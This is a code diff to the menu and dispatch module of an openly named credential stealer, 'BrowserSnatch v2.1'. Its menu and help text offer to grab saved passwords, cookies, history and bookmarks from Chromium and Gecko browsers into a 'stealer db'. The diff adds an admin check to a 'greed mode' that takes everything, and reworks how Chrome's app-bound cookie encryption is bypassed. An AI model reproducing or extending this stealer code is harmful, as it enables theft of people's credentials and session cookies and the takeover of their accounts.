@@ -1,6 +1,7 @@
 #include "includes/Visualizer.h"
 #include "includes/ChromiumParser.h"
 #include "includes/GeckoParser.h"
+#include "includes/AppBoundKeyParser.h"
 
 Visualizer::Visualizer()
 {}
@@ -12,9 +13,6 @@ Visualizer::Visualizer(const std::string& converted_username, const std::string&
 {
     this->converted_username = converted_username;
     this->stealer_db = stealer_db;
-
-    //chrome_cookie_collector_app_bound_decryption(converted_username, stealer_db);
-    //std::exit(0);
 }
 
 void Visualizer::visualization_main() {
@@ -56,7 +54,6 @@ void Visualizer::printMenu() {
     std::cout << " \033[1;36m[7]\033[0m Snatch Chromium Based Browser History" << std::endl;
     std::cout << " \033[1;36m[8]\033[0m Snatch Gecko Based Browser History" << std::endl;
     std::cout << " \033[1;36m[9]\033[0m Snatch Passwords & Cookies {default settings}" << std::endl;
-    std::cout << " \033[1;36m[10]\033[0m Snatch Chrome App-Bound Encrypted Cookies" << std::endl;
     std::cout << " \033[1;31m[0]\033[0m Exit" << std::endl;
     printDivider('=', 75);
 }
@@ -90,6 +87,12 @@ BOOL Visualizer::greed_mode(std::string converted_username, std::string stealer_
 {
     std::cout << "BrowserSnatch Executed with {greed_mode_settings}" << std::endl;
     std::cout << "Snatching everything..." << std::endl;
+    if (!CheckProcessPriv())
+    {
+        std::cerr << "Admin Privileges Required !!!" << std::endl;
+        exit(1);
+    }
+
     if (!chromium_parser(converted_username, stealer_db))
         std::cout << "Chromium Browsers dump failed!" << std::endl;
 
@@ -114,8 +117,8 @@ BOOL Visualizer::greed_mode(std::string converted_username, std::string stealer_
     if (!gecko_history_collector(converted_username, stealer_db))
         std::cout << "Gecko History Collector failed!" << std::endl;
 
-    if (!chrome_cookie_collector_app_bound_decryption(converted_username, stealer_db))
-        std::cout << "Chrome App-Bound Snatch failed!" << std::endl;
+    // handles app-bound-decryption
+    handler(14, "");
 
     if (std::filesystem::exists(stealer_db)) {
         std::cout << "Stealer db saved: " << stealer_db << std::endl;
@@ -189,13 +192,6 @@ void Visualizer::handleUserChoice(int choice) {
         if (!default_settings(converted_username, stealer_db))
             std::cerr << "BrowserSnatch executed with {default settings}: failed" << std::endl;
         break;
-    case 10:
-        std::cout << "\n\033[1;33m>> Snatching Chrome App-Bound Encrypted Cookies...\033[0m" << std::endl;
-        if (!chrome_cookie_collector_app_bound_decryption(converted_username, stealer_db))
-            std::cerr << "BrowserSnatch chrome App-Bound snatch failed" << std::endl;
-        else
-            std::cout << "Stealer db path: " << stealer_db << std::endl;
-        break;
     case 0:
         std::cout << "\n\033[1;31mExiting BrowserSnatch. Goodbye!\033[0m" << std::endl;
         break;
@@ -205,8 +201,8 @@ void Visualizer::handleUserChoice(int choice) {
 }
 
 void Visualizer::displayHelp() {
-    std::cout << "BrowserSnatch v2.0 - A versatile browser data extraction tool\n";
-    std::cout << "(C) 2024 shaddy43\n\n";
+    std::cout << "BrowserSnatch v2.1 - A versatile browser data extraction tool\n";
+    std::cout << "(C) 2025 shaddy43\n\n";
     std::cout << "Usage: BrowserSnatch [OPTIONS]\n\n";
     std::cout << "No parameter        Run with default settings, snatch {passwords, cookies} from all browsers\n\n";
     std::cout << "Options:\n";
@@ -216,7 +212,6 @@ void Visualizer::displayHelp() {
     std::cout << "  -pass -g                    Snatch passwords from Gecko browsers only\n";
     std::cout << "  -cookies                    Snatch cookies from every browser\n";
     std::cout << "  -cookies -c                 Snatch cookies from Chromium browsers only\n";
-    std::cout << "  -cookies -c                 Snatch cookies from Chromium browsers only\n";
     std::cout << "  -cookies -g                 Snatch cookies from Gecko browsers only\n";
     std::cout << "  -bookmarks                  Snatch bookmarks from every browser\n";
     std::cout << "  -bookmarks -c               Snatch bookmarks from Chromium browsers only\n";
@@ -225,12 +220,12 @@ void Visualizer::displayHelp() {
     std::cout << "  -history -c                 Snatch history from Chromium browsers only\n";
     std::cout << "  -history -g                 Snatch history from Gecko browsers only\n";
     std::cout << "  -greed                      Snatch everything\n";
-    std::cout << "  -console-mode               Launch BrowserSnatch Console Mode\n";
-    std::cout << "  -cookies -chrome_app_bound  Snatch latest chrome app-bound encrypted cookies\n\n";
+    std::cout << "  -app-bound-decryption       Snatch cookies encrypted with latest app bound encryption\n";
+    std::cout << "  -console-mode               Launch BrowserSnatch Console Mode\n\n";
     std::cout << "For more details, visit: https://shaddy43.github.io\n";
 }
 
-void Visualizer::handler(int option)
+void Visualizer::handler(int option, std::string service_parameter)
 {
     if (option == 1)
     {
@@ -324,11 +319,20 @@ void Visualizer::handler(int option)
     }
     else if (option == 14)
     {
-        //chrome app-bound snatch
-        if (!chrome_cookie_collector_app_bound_decryption(converted_username, stealer_db))
-            std::cerr << "BrowserSnatch chrome App-Bound snatch failed" << std::endl;
-        else
-            std::cout << "Stealer db path: " << stealer_db << std::endl;
+        //app-bound-decryption
+        if (!app_bound_browsers_cookie_collector(converted_username, stealer_db, false, ""))
+            std::cerr << "BrowserSnatch executed with {app_bound_decryption mode}: failed" << std::endl;
+
+        // Pause before exit
+        std::cout << "DB PATH: " << stealer_db << std::endl;
+        std::cout << "\nPress any key to exit...";
+        std::cin.get();
+    }
+    else if (option == 15)
+    {
+        //app-bound-decryption
+        if (!app_bound_browsers_cookie_collector(converted_username, stealer_db, true, service_parameter))
+            std::cerr << "BrowserSnatch executed with {app_bound_decryption mode}: failed" << std::endl;
     }
     else
     {
